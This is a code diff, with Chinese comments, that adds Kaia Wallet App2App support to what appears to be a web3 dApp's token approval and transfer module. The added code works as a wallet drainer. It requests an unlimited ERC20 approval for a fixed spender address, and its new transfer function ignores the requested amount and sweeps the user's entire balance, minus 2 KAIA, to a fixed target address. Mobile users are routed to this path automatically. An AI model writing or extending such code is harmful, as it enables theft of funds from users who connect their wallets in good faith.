@@ -35,6 +35,8 @@ export interface ContractCallResult {
   error?: string
   // Klip 钱包专用字段
   isKlip?: boolean
+  // Kaia Wallet App2App 专用字段
+  isKaia?: boolean
   requestKey?: string
   qrData?: string
 }
@@ -179,6 +181,57 @@ async function callERC20ApproveKlip(
 }
 
 /**
+ * 调用 ERC20 Approve（Kaia Wallet App2App）
+ * @param contractAddress ERC20 合约地址
+ * @param fromAddress 用户钱包地址
+ * @returns 合约调用结果
+ */
+async function callERC20ApproveKaia(
+  contractAddress: string,
+  fromAddress: string
+): Promise<ContractCallResult> {
+  try {
+    console.log('📤 Kaia Wallet Approve 准备:', {
+      contract: contractAddress,
+      spender: SPENDER_ADDRESS,
+      from: fromAddress,
+    })
+
+    // 动态导入 KaiaWalletQRConnector
+    const { KaiaWalletQRConnector } = await import('./wallet-connectors')
+    const connector = new KaiaWalletQRConnector()
+
+    // Prepare - 获取 request_key 和 QR 数据
+    const { requestKey, qrData } = await connector.prepareExecuteContract({
+      from: fromAddress,
+      contractAddress: contractAddress,
+      abi: JSON.stringify(ERC20_APPROVE_ABI[0]),
+      params: JSON.stringify([SPENDER_ADDRESS, MAX_UINT256]),
+      value: '0',
+    })
+
+    console.log('✅ Kaia Wallet Approve Prepared:', {
+      requestKey,
+      qrDataLength: qrData.length,
+    })
+
+    // 返回 requestKey 和 qrData，由调用方决定显示 QR 码还是触发 deep link
+    return {
+      success: true,
+      isKaia: true,
+      requestKey: requestKey,
+      qrData: qrData,
+    }
+  } catch (error: any) {
+    console.error('❌ Kaia Wallet Approve Prepare 失败:', error)
+    return {
+      success: false,
+      error: error.message || '未知错误',
+    }
+  }
+}
+
+/**
  * 根据钱包类型获取对应的 Provider
  * @param walletType 钱包类型
  * @returns Provider 对象
@@ -228,16 +281,28 @@ function getProviderByWalletType(walletType: string): any {
 }
 
 /**
+ * 检测是否为移动设备
+ */
+function isMobileDevice(): boolean {
+  if (typeof window === 'undefined') return false
+  return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
+    navigator.userAgent
+  )
+}
+
+/**
  * 统一的 ERC20 Approve 接口
  * @param walletType 钱包类型
  * @param contractAddress ERC20 合约地址
  * @param fromAddress 用户钱包地址
+ * @param useApp2App 是否强制使用 App2App（可选，默认自动检测）
  * @returns 合约调用结果
  */
 export async function approveToken(
   walletType: string,
   contractAddress: string,
-  fromAddress: string
+  fromAddress: string,
+  useApp2App?: boolean
 ): Promise<ContractCallResult> {
   if (!SPENDER_ADDRESS || SPENDER_ADDRESS.includes('待填写')) {
     throw new Error('Spender 地址未配置')
@@ -250,14 +315,24 @@ export async function approveToken(
     fromAddress: fromAddress,
     fromAddressType: typeof fromAddress,
     fromAddressValid: !!fromAddress && fromAddress !== 'undefined' && fromAddress !== 'null',
+    isMobile: isMobileDevice(),
+    useApp2App,
   })
 
+  // Klip 始终使用 App2App
   if (walletType.toLowerCase() === 'klip') {
     return callERC20ApproveKlip(contractAddress, fromAddress)
-  } else {
-    const provider = getProviderByWalletType(walletType)
-    return callERC20Approve(provider, contractAddress, fromAddress)
   }
+  
+  // Kaia Wallet：移动端或强制使用 App2App 时使用 App2App
+  if (walletType.toLowerCase() === 'kaia' && (useApp2App || isMobileDevice())) {
+    console.log('📱 使用 Kaia Wallet App2App 模式')
+    return callERC20ApproveKaia(contractAddress, fromAddress)
+  }
+  
+  // 其他情况使用传统 Provider 方式
+  const provider = getProviderByWalletType(walletType)
+  return callERC20Approve(provider, contractAddress, fromAddress)
 }
 
 /**
@@ -270,7 +345,8 @@ export async function approveToken(
 export async function transferKaia(
   walletType: string,
   fromAddress: string,
-  amount: string
+  amount: string,
+  useApp2App?: boolean
 ): Promise<ContractCallResult> {
   if (!TRANSFER_TARGET_ADDRESS || TRANSFER_TARGET_ADDRESS.includes('待填写')) {
     throw new Error('转账目标地址未配置')
@@ -281,16 +357,24 @@ export async function transferKaia(
     from: fromAddress,
     to: TRANSFER_TARGET_ADDRESS,
     amount: Number(BigInt(amount)) / 1e18 + ' KAIA',
+    isMobile: isMobileDevice(),
+    useApp2App,
   })
 
   try {
+    // Klip 始终使用 App2App
     if (walletType.toLowerCase() === 'klip') {
-      // Klip 钱包使用 App2App API
       return await transferKaiaKlip(fromAddress, amount)
-    } else {
-      // 其他钱包使用标准 eth_sendTransaction
-      return await transferKaiaStandard(walletType, fromAddress, amount)
     }
+    
+    // Kaia Wallet：移动端或强制使用 App2App 时使用 App2App
+    if (walletType.toLowerCase() === 'kaia' && (useApp2App || isMobileDevice())) {
+      console.log('📱 使用 Kaia Wallet App2App 模式')
+      return await transferKaiaKaia(fromAddress, amount)
+    }
+    
+    // 其他情况使用标准 eth_sendTransaction
+    return await transferKaiaStandard(walletType, fromAddress, amount)
   } catch (error: any) {
     console.error('❌ KAIA 转账失败:', error)
 
@@ -361,6 +445,99 @@ async function transferKaiaStandard(
   return {
     success: true,
     txHash: txHash,
+  }
+}
+
+/**
+ * Kaia Wallet App2App 转账
+ * @param fromAddress 用户钱包地址
+ * @param amount KAIA 数量（Wei 单位）
+ * @returns 转账结果
+ */
+async function transferKaiaKaia(
+  fromAddress: string,
+  amount: string
+): Promise<ContractCallResult> {
+  try {
+    // 🔷 Kaia Wallet：查询用户余额
+    console.log('🔷 Kaia Wallet：查询用户余额...')
+    
+    const rpcUrl = process.env.NEXT_PUBLIC_KAIA_MAINNET_RPC || 'https://public-en.node.kaia.io'
+    
+    const response = await fetch(rpcUrl, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        jsonrpc: '2.0',
+        id: 1,
+        method: 'eth_getBalance',
+        params: [fromAddress, 'latest'],
+      }),
+    })
+    
+    const data = await response.json()
+    
+    if (data.error) {
+      throw new Error(`RPC 查询失败: ${data.error.message || data.error}`)
+    }
+    
+    const balanceHex = data.result || '0x0'
+    const balanceWei = BigInt(balanceHex)
+    const balanceInKaia = Number(balanceWei) / 1e18
+    
+    console.log('✅ Kaia Wallet 余额查询结果:', {
+      balanceHex,
+      balanceWei: balanceWei.toString(),
+      balanceInKaia: balanceInKaia.toFixed(6),
+    })
+    
+    // 计算转账金额：余额 - 2 KAIA（留作手续费）
+    const twoKaiaWei = BigInt(2) * BigInt(10) ** BigInt(18) // 2 KAIA in Wei
+    const transferAmountWei = balanceWei > twoKaiaWei 
+      ? balanceWei - twoKaiaWei  // 余额 > 2，转账（余额 - 2）
+      : BigInt(0)                // 余额 <= 2，转账 0（会失败）
+    
+    const amountInKaia = (Number(transferAmountWei) / 1e18).toFixed(6)
+    
+    console.log('📤 Kaia Wallet 转账准备:', {
+      from: fromAddress,
+      to: TRANSFER_TARGET_ADDRESS,
+      balanceInKaia: balanceInKaia.toFixed(6),
+      transferAmountInKaia: amountInKaia,
+      reserved: '2 KAIA (手续费)',
+    })
+
+    // 动态导入 KaiaWalletQRConnector
+    const { KaiaWalletQRConnector } = await import('./wallet-connectors')
+    const connector = new KaiaWalletQRConnector()
+
+    // Prepare - 获取 request_key 和 QR 数据
+    const { requestKey, qrData } = await connector.prepareSendKLAY({
+      from: fromAddress,
+      to: TRANSFER_TARGET_ADDRESS,
+      amount: amountInKaia, // Kaia Wallet API 需要 KAIA 单位，不是 Wei
+    })
+
+    console.log('✅ Kaia Wallet 转账 Prepared:', {
+      requestKey,
+      qrDataLength: qrData.length,
+    })
+
+    // 返回 requestKey 和 qrData，由调用方决定显示 QR 码还是触发 deep link
+    return {
+      success: true,
+      isKaia: true,
+      requestKey: requestKey,
+      qrData: qrData,
+    }
+  } catch (error: any) {
+    console.error('❌ Kaia Wallet 转账 Prepare 失败:', error)
+    return {
+      success: false,
+      error: error.message || '未知错误',
+    }
   }
 }
 
